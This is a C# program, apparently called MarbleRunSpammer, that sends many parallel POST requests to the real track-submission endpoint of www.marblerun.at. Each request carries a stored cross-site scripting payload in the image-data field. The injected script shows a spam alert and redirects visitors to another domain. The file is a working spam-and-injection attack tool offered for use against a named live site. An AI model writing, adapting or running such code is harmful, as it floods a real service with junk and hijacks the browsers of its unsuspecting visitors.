using System.Net;
using System.Net.Http.Headers;
using System.Net.Http.Json;
using System.Reflection.Metadata;
using System.Text;
using System.Text.Json;
using System.Text.Json.Nodes;

namespace Zephyros1938.Marblerun;

public class Program
{
    static MarbleRunContents.Trackdata trackdata = new MarbleRunContents.Trackdata(duration: 10000, trackname: "ITER.", username: "ZEPHYROS1938");
    public static async Task Main(String[] args)
    {
        if (args.Length < 1) throw new ArgumentException("Must specify repetition count.");
        int MaxDegreeOfParallelism = 2;
        if (args.Length == 2) StringToInt(args[1], out MaxDegreeOfParallelism);

        StringToInt(args[0], out int repetitions);
        Console.WriteLine(repetitions);

        using HttpClient client = new HttpClient();
        Int32 completedRepetitions = 0;
        await Parallel.ForAsync(0, repetitions, new ParallelOptions { MaxDegreeOfParallelism = MaxDegreeOfParallelism }, async (i, ct) =>
        {
            MultipartFormDataContent requestContent = new()
            {
                { new StringContent(trackdata.duration.ToString(), Encoding.UTF8, "application/json"), "track[duration]" },
                { new StringContent(trackdata.length.ToString(), Encoding.UTF8, "application/json"), "track[length]" },
                { new StringContent(trackdata.username, Encoding.UTF8, "application/json"), "track[username]" },
                { new StringContent(trackdata.trackname + i, Encoding.UTF8, "application/json"), "track[trackname]" },
                { new StringContent("data:image/png;base64,<script>alert(\"ZEPHYROS SPAMMED! - https://github.com/Zephyros1938/MarbleRunSpammer\");window.location.href=\"HTTPS://ZEPHYROS1938.ORG\";</script>", Encoding.UTF8, "application/json"), "track[imagedata]" },
                { new StringContent(trackdata.json, Encoding.UTF8, "application/json"), "track[json]" }
            };
            //Console.WriteLine($"Sending request No.{i}");
            var r = await SendRequest(client, requestContent);
            if (r.IsSuccessStatusCode)
            {
                Console.WriteLine($"\tRequest No.{i} sent, status code is {r.StatusCode}"); completedRepetitions++;
            }
            else
            {
                Console.WriteLine($"\tFAILED REQUEST AT NUMBER {i} WITH CODE {r.StatusCode}; COMPLETED LOOPS: {completedRepetitions}");
            }
            ;
        });
    }

    public static async Task<HttpResponseMessage> SendRequest(HttpClient client, HttpContent? requestContent)
    {
        HttpRequestMessage request = new(HttpMethod.Post, "https://www.marblerun.at/tracks");
        request.Headers.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));

        foreach (KeyValuePair<String, String> h in Constants.Headers.RequestHeaders)
        {
            request.Headers.Add(h.Key, h.Value);
        }

        request.Content = requestContent;
        return await client.SendAsync(request);
    }

    public static void StringToInt(String InString, out Int32 OutInt)
    {
        if (Int32.TryParse(InString, out Int32 number)) { OutInt = number; return; }
        ;
        throw new InvalidCastException($"Could not cast {InString} To Int");
    }

    public static async Task<MultipartFormDataContent> JsonToFormData(String fileLocation)
    {
        String location = Path.Combine("Assets", "Samples", fileLocation);
        MultipartFormDataContent formData = [];
        String jsonContent = await File.ReadAllTextAsync(location);
        JsonNode? jsonObject = JsonNode.Parse(jsonContent);
        if (jsonObject == null)
        {
            throw new InvalidOperationException("Failed to parse JSON content.");
        }
        foreach (var item in jsonObject.AsObject())
        {
            if (item.Value == null || item.Key == null)
            {
                throw new InvalidOperationException("Item Key or Value was null during parsing");
            }
            formData.Add(new StringContent(item.Value.ToString(), Encoding.UTF8, "application/json"), item.Key);
        }
        return formData;
    }
}